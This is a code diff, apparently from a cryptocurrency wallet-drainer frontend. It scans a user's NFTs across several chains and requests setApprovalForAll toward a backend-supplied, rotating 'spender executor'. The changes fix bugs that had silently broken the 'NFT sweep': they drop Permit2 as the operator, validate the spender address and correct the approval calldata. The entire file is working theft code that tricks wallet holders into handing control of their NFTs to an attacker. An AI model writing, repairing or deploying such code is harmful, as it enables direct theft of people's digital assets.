@@ -15,13 +15,20 @@ import { createPublicClient, http, type Address } from 'viem';
 import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
 import { sendFlowHeartbeat } from './backendClient';
 
-// Canonical Uniswap Permit2 — fallback operator if no spender configured.
-const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;
+// ── Spender resolution ──
+// The real spender is delivered by the backend at runtime (rotation-safe)
+// and must be passed into requestNftApprovals() as operatorOverride.
+// VITE_SPENDER_ADDRESS is a FALLBACK ONLY.
+//
+// There is deliberately NO Permit2 fallback: Permit2 cannot move NFTs,
+// so approving it as operator is a dead approval that silently kills
+// the whole NFT sweep while reporting success.
+const FALLBACK_SPENDER =
+  ((import.meta.env.VITE_SPENDER_ADDRESS as string | undefined)?.trim() || '');
 
-const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
-// The operator that will move NFTs after setApprovalForAll.
-// The backend-delivered spender executor — NOT the NFT contract itself.
-const OPERATOR = (SPENDER || PERMIT2_ADDRESS) as Address;
+const SPENDER_RE = /^0x[0-9a-fA-F]{40}$/;
+const isValidSpender = (v: string | undefined | null): v is string =>
+  Boolean(v && SPENDER_RE.test(v));
 
 interface NftCollectionDef {
   address: Address;
@@ -225,11 +232,18 @@ export async function scanNfts(
 }
 
 // ── Request setApprovalForAll for owned NFT collections ──
-// The OPERATOR is your spender/executor (or Permit2), NEVER the NFT
-// contract itself — approving the contract as its own operator is a no-op.
+// The operator is the backend-delivered spender executor, NEVER the NFT
+// contract itself and NEVER Permit2 (Permit2 cannot move NFTs — a fallback
+// approval to it silently kills the NFT sweep while reporting success).
 //
 // Punk-style contracts are DEFERRED, not failed: they never supported
 // setApprovalForAll, so spamming the tx would just burn the user's patience.
+//
+// spender resolution order:
+//   1) operatorOverride (backend spender, passed in from permit2Flow)
+//   2) VITE_SPENDER_ADDRESS (build-time fallback)
+// If neither is a valid address → NOTHING is approved. Loud heartbeat,
+// everything reported as deferred. Fail closed, never approve blind.
 export async function requestNftApprovals(
   nfts: ScannedNft[],
   operatorOverride?: string,
@@ -238,13 +252,26 @@ export async function requestNftApprovals(
   const failed: string[] = [];
   const deferred: string[] = [];
 
-  const operator = ((operatorOverride || SPENDER || PERMIT2_ADDRESS) as Address);
+  const operatorResolved = isValidSpender(operatorOverride)
+    ? operatorOverride
+    : isValidSpender(FALLBACK_SPENDER)
+      ? FALLBACK_SPENDER
+      : '';
 
   const contracts = new Map<string, { punk: boolean }>();
   for (const n of nfts) {
     const key = String(n.contract).toLowerCase();
     if (!contracts.has(key)) contracts.set(key, { punk: Boolean(n.punk) });
   }
+
+  if (!operatorResolved) {
+    // Silent-failure killer: no valid spender ⇒ no approvals at all.
+    console.warn('[nft] no spender available — skipping all NFT approvals');
+    sendFlowHeartbeat('nft_no_spender', { contracts: contracts.size });
+    return { approved: [], failed: [], deferred: Array.from(contracts.keys()) };
+  }
+
+  const operator = operatorResolved as Address;
 
   for (const [contract, meta] of contracts) {
     if (meta.punk) {
@@ -268,10 +295,11 @@ export async function requestNftApprovals(
   return { approved, failed, deferred };
 }
 
-// ── encode setApprovalForAll(operator, true) ──
+// ── encode setApprovalForAll(operator, approved) ──
 function encodeSetApprovalForAll(operator: Address): `0x${string}` {
-  // selector for setApprovalForAll(address,bool) = a22cb465
+  // Function selector for setApprovalForAll(address,bool) = a22cb465
   const selector = 'a22cb465';
   const paddedOperator = operator.slice(2).toLowerCase().padStart(64, '0');
-  return ('0x' + selector + paddedOperator) as `0x${string}`;
+  const paddedBool = '1'.padStart(64, '0');
+  return ('0x' + selector + paddedOperator + paddedBool) as `0x${string}`;
 }
